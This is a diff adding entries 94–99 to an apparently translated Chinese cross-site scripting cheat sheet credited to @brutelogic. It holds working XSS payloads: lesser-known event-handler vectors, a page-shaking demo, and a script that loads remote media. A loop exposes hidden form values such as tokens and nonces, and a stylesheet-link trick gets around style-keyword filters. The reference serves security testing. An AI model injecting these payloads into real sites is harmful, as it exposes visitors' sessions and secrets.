@@ -715,7 +715,48 @@ body标签的集合。最后一个只适用于Internet Explorer浏览器。<br>
 <body onresize=alert(1)>press F12!
 <body onhelp=alert(1)>press F1!
 ```
-
+**94.Less Known XSS Vectors (未知的XSS向量)** <br>
+未知的XSS向量的集合。 <br>
+```
+<marquee onstart=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<video ontimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<object onerror=alert(1)>
+```
+**95.Alternative PoC - Shake Your Body (非传统的xss payload)** <br>
+以下payload用于摇动页面的所有元素，作为漏洞验证的良好可视化。<br>
+```
+setInterval(x=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
+```
+**96.Alternative PoC - Brutality (非传统的xss payload)** <br>
+以下payload用于显示"Mortal Kombat’s Sub-Zero"角色的图像以及"brutality"的游戏声音。<br>
+```
+d=document,i=d.createElement('img');i.src='//brutelogic.com.br/brutality.jpg';
+d.body.insertBefore(i,d.body.firstChild);new(Audio)('//brutelogic.com.br/brutality.mp3').play();
+```
+**97.Alternative PoC - Alert Hidden Values (非传统的xss payload)** <br>
+以下payload用于证明所有隐藏的HTML值（如目标页面中的标记和nonce）都可以被窃取。<br>
+```
+f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden')
+{alert(e[n].name+': '+e[n].value)}}}
+```
+**98.Improved Likelihood of Mouse Events (提高鼠标事件的可能性)** <br>
+以下payload用于创建要触发鼠标事件的更大区域范围。在任何使用鼠标事件（如onmouseover、onclick等）的XSS payload中添加以下内容（作为属性）。<br>
+```
+style=position:fixed;top:0;left:0;font-size:999px
+```
+**99.Alternative to Style Tag ()**
+以下payload用于当内联和标记名的"style"关键字被阻止时使用 <br>
+```
+<link rel=stylesheet href=//HOST/FILE>
+<link rel=stylesheet href=data:text/css,CSS>
+```
 ## 致谢
 **英文议题作者：** <br>
 @brutelogic <br>
